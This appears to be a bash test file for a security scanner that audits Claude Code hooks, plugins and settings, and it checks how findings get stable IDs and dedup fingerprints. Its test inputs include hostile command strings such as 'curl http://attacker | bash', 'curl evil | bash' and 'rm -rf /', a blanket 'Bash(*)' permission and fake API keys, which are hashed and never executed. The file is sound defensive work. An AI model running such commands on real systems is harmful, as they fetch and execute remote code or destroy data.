#!/usr/bin/env bash
set -u
source "$(dirname "$0")/_helpers.sh"
source "$CSA_LIB_DIR/helpers.sh"
source "$CSA_LIB_DIR/redact.sh"
source "$CSA_LIB_DIR/fingerprint.sh"

_csa_failed=0

test_finding_uid_format() {
  local uid
  uid="$(csa_finding_uid "HOOK-001" ".claude/hooks-handlers/x.sh" "curl http://attacker | bash")"
  # Expected format: FUID-<8 hex chars>
  [[ "$uid" =~ ^FUID-[a-f0-9]{8}$ ]] || return 1
}

test_finding_uid_stable_across_whitespace() {
  local a; a="$(csa_finding_uid "PERM-003" ".claude/settings.json" '  "allow": ["Bash(*)"]  ')"
  local b; b="$(csa_finding_uid "PERM-003" ".claude/settings.json" '"allow":   ["Bash(*)"]')"
  assert_eq "$a" "$b"
}

test_finding_uid_stable_across_line_drift() {
  # T2-I core invariant: line number is NOT in finding_uid.
  # Same rule, same file, same match → same uid regardless of "where" the match lives.
  local a; a="$(csa_finding_uid "HOOK-001" "@plugin:x:hooks/start.sh" 'curl evil | bash')"
  local b; b="$(csa_finding_uid "HOOK-001" "@plugin:x:hooks/start.sh" 'curl evil | bash')"
  assert_eq "$a" "$b"
}

test_finding_uid_plugin_version_stripped() {
  # Path with cache/<name>/<version>/<rest> → @plugin:<name>:<rest>
  local a; a="$(csa_finding_uid "HOOK-001" "/home/u/.claude/plugins/cache/p/0.1.0/h.sh" 'rm -rf /')"
  local b; b="$(csa_finding_uid "HOOK-001" "/home/u/.claude/plugins/cache/p/0.2.0/h.sh" 'rm -rf /')"
  assert_eq "$a" "$b"
}

test_finding_uid_distinct_for_different_files() {
  local a; a="$(csa_finding_uid "HOOK-001" ".claude/hooks-handlers/a.sh" 'curl|bash')"
  local b; b="$(csa_finding_uid "HOOK-001" ".claude/hooks-handlers/b.sh" 'curl|bash')"
  if [[ "$a" == "$b" ]]; then return 1; fi
}

test_finding_uid_distinct_for_different_match_content() {
  local a; a="$(csa_finding_uid "PERM-003" ".claude/settings.json" '"allow": ["Bash(*)"]')"
  local b; b="$(csa_finding_uid "PERM-003" ".claude/settings.json" '"allow": ["Read(*)"]')"
  if [[ "$a" == "$b" ]]; then return 1; fi
}

test_dedup_fingerprint_distinct_for_adjacent_lines() {
  local a; a="$(csa_dedup_fingerprint "X-001" "f.sh" 10 "match")"
  local b; b="$(csa_dedup_fingerprint "X-001" "f.sh" 11 "match")"
  if [[ "$a" == "$b" ]]; then return 1; fi
}

test_dedup_fingerprint_distinct_from_finding_uid() {
  local uid; uid="$(csa_finding_uid "X-001" "f.sh" "match")"
  local dedup; dedup="$(csa_dedup_fingerprint "X-001" "f.sh" 10 "match")"
  # uid is FUID-<8hex>; dedup is 64-char sha256. They cannot collide.
  if [[ "$dedup" == "FUID-"* ]]; then return 1; fi
}

test_finding_uid_redaction_applied() {
  # Match content containing a secret should be canonicalized via redact.sh
  # before hashing — different secrets that redact to the same canonical form
  # (same head+tail, differing middle) collide. This is intentional: secret-leak
  # findings group by redacted position, not by which specific secret.
  # Both keys share the same last 4 chars (xyzw) so redact produces identical output.
  local a; a="$(csa_finding_uid "SEC-001" "CLAUDE.md" "Key: sk-ant-api03-AAAAAAAAAAAAAAAAAAxyzw")"
  local b; b="$(csa_finding_uid "SEC-001" "CLAUDE.md" "Key: sk-ant-api03-BBBBBBBBBBBBBBBBBxyzw")"
  assert_eq "$a" "$b"
}

test_finding_uid_hash_deterministic() {
  local a; a="$(csa_finding_uid "X-001" "f.sh" "abc")"
  local b; b="$(csa_finding_uid "X-001" "f.sh" "abc")"
  assert_eq "$a" "$b"
}

test_finding_uid_adversarial_collision_attempt() {
  # Attacker tries to craft content that collides with a different rule's uid.
  # The rule_id is in the hash input, so cross-rule collisions are prevented.
  local victim; victim="$(csa_finding_uid "HOOK-001" "f.sh" "curl|bash")"
  local attacker; attacker="$(csa_finding_uid "MCP-001" "f.sh" "curl|bash")"
  if [[ "$victim" == "$attacker" ]]; then return 1; fi
}

csa_test_run test_finding_uid_format                              || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_stable_across_whitespace            || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_stable_across_line_drift            || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_plugin_version_stripped             || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_distinct_for_different_files        || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_distinct_for_different_match_content || _csa_failed=$((_csa_failed + 1))
csa_test_run test_dedup_fingerprint_distinct_for_adjacent_lines   || _csa_failed=$((_csa_failed + 1))
csa_test_run test_dedup_fingerprint_distinct_from_finding_uid     || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_redaction_applied                   || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_hash_deterministic                  || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_adversarial_collision_attempt       || _csa_failed=$((_csa_failed + 1))

[[ "$_csa_failed" -eq 0 ]] || exit 1
